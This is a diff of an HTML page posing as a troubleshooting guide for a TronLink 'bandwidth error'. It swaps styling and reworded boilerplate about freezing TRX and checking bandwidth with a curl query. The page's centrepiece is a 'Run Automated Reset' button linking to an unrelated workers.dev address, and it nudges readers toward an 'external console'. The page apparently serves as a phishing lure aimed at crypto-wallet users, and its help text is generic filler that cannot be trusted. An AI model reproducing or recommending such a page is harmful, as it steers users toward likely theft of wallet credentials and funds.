@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #121214;
+        font-family: sans-serif;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -41,31 +41,30 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with the TRON network using TronLink, a popular wallet and browser extension.</li>
+<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network, resulting in failed transactions and inability to execute desired actions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to process transactions on the network. This can be caused by a lack of TRX (TRON's native cryptocurrency) holdings or an insufficient bandwidth reservation.</li>
+<li>The error occurs due to insufficient bandwidth, which is a resource required for transactions on the TRON network. Bandwidth is typically obtained by freezing TRX (TRON's native cryptocurrency) or by purchasing it from other users.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase TRX holdings to reserve more bandwidth:</li>
-<li>Purchase additional TRX to stake and reserve bandwidth</li>
-<li>Delegate TRX to a witness or super representative to increase bandwidth</li>
-<li>Use the following command to check bandwidth:</li>
+<li>Increase the bandwidth by freezing more TRX or purchasing bandwidth from other users.</li>
+<li>Adjust the transaction parameters to require less bandwidth, such as reducing the transaction size or gas limit.</li>
+<li>Utilize the following bash command to check available bandwidth:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>https://api.trongrid.io/wallet/getaccount<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>http://127.0.0.1:8090/wallet/getaccount<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;address&quot;: &quot;your_tron_address&quot;}&#39;</span>
 </code></pre></div>
 
-<p>Consider using an external console for advanced troubleshooting and diagnostics. </p>
+<p>For more detailed analysis, consider accessing the network via an external console to diagnose the issue more effectively.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A basic understanding of the TRON ecosystem and its native cryptocurrency, TRX</li>
-<li>A TronLink wallet with a registered account</li>
-<li>A sufficient amount of TRX for bandwidth reservation and transaction fees</li>
+<li>A TRON wallet with a sufficient balance of TRX.</li>
+<li>A basic understanding of the TRON network and its transaction mechanics.</li>
+<li>The TronLink extension installed and configured in the user's browser.</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
